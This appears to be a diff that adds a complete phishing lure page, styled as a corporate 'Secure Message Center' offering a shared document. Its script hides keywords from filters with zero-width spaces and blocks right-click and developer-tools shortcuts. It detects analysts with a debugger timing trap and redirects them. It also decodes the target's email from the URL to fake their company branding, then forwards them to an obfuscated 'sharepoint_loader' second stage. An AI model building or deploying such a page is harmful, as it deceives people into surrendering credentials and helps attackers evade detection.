@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sec&#8203;ure Mess&#8203;age Cent&#8203;er</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f4f4; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 4px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 400px; }
+        #compLogo { height: 48px; margin-bottom: 20px; border-radius: 4px; }
+        .btn { background: #0078d4; color: white; padding: 12px 30px; text-decoration: none; border-radius: 2px; font-weight: 600; cursor: pointer; border: none; font-size: 16px; }
+        .btn:hover { background: #005a9e; }
+        .footer { margin-top: 25px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; }
+        h2 { margin-top: 0; font-size: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo.dev API integration -->
+        <img id="compLogo" src="https://img.logo.dev/microsoft.com?token=pk_R828WZ8zQcWbVFZyYhqu6A" alt="Logo">
+        
+        <h2><span id="compName">Corpor&#8203;ate</span> Sec&#8203;ure Docum&#8203;ent</h2>
+        <p>A restricted file has been shared with you via the <span id="compName2">organiz&#8203;ation</span> portal.</p>
+        <br>
+        <button onclick="stg2()" class="btn">View Mess&#8203;age</button>
+        <div class="footer">Encry&#8203;pted with AES-256 for <span id="userMail">your acco&#8203;unt</span></div>
+    </div>
+
+    <script>
+	// 1. Disable Right-Click
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+// 2. Disable Keyboard Shortcuts (F12, Ctrl+Shift+I, Ctrl+U)
+document.onkeydown = function(e) {
+    // F12
+    if (event.keyCode == 123) return false;
+    // Ctrl+Shift+I (Inspect)
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+    // Ctrl+Shift+C (Element Selector)
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+    // Ctrl+Shift+J (Console)
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+    // Ctrl+U (View Source - though this doesn't stop the browser's top menu)
+    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+};
+
+// 3. DevTools Detection (Redirect if they manage to open it)
+setInterval(function() {
+    var before = new Date().getTime();
+    debugger; // This pauses the browser if DevTools is open
+    var after = new Date().getTime();
+    if (after - before > 100) { 
+        // If the pause was long, DevTools is likely open
+        window.location.href = "https://www.microsoft.com/en-us/microsoft-365"; 
+    }
+}, 1000);
+    (function() {
+        var h = window.location.hash.replace('#', '');
+        if (!h) return;
+
+        var email = "";
+
+        // --- DECODER FUNCTIONS ---
+        
+        function fromBinary(str) {
+            var clean = str.replace(/\s/g, '');
+            if (!/^[01]+$/.test(clean) || clean.length % 8 !== 0) return null;
+            var res = "";
+            for (var i = 0; i < clean.length; i += 8) {
+                res += String.fromCharCode(parseInt(clean.substr(i, 8), 2));
+            }
+            return res.includes('@') ? res : null;
+        }
+
+        function fromHex(str) {
+            if (!/^[0-9A-Fa-f]+$/.test(str) || str.length % 2 !== 0) return null;
+            var res = "";
+            for (var i = 0; i < str.length; i += 2) {
+                res += String.fromCharCode(parseInt(str.substr(i, 2), 16));
+            }
+            return res.includes('@') ? res : null;
+        }
+
+        // --- DETECTION LOGIC ---
+
+        var bin = fromBinary(h);
+        var hex = fromHex(h);
+        
+        if (bin) {
+            email = bin;
+        } else if (hex) {
+            email = hex;
+        } else {
+            try {
+                // Check Base64 (Standard B64 doesn't have @)
+                if (/^[A-Za-z0-9+/=]+$/.test(h) && !h.includes('@')) {
+                    var b64 = atob(h);
+                    email = b64.includes('@') ? b64 : h;
+                } else {
+                    email = decodeURIComponent(h);
+                }
+            } catch (e) {
+                email = decodeURIComponent(h);
+            }
+        }
+
+        // --- UI PERSONALIZATION ---
+
+        if (email.includes('@')) {
+            var domain = email.split('@')[1].toLowerCase();
+            var name = domain.split('.')[0].toUpperCase();
+            
+            // Set Logo (Using Logo.dev - replace with your token)
+            document.getElementById('compLogo').src = 'https://img.logo.dev/' + domain + '?token=pk_R828WZ8zQcWbVFZyYhqu6A';
+            
+            // Update UI elements
+            document.getElementById('compName').textContent = name;
+            document.getElementById('compName2').textContent = name;
+            document.getElementById('userMail').textContent = email;
+        }
+    })();
+
+    function stg2() {
+        var _n = 'sha\u200Brep\u200Boint_'.replace(/\u200B/g, '');
+        var _e = 'load\u200Ber.ht\u200Bml'.replace(/\u200B/g, '');
+        window.location.href = _n + _e + window.location.hash;
+    }
+</script>
+</body>
+</html>
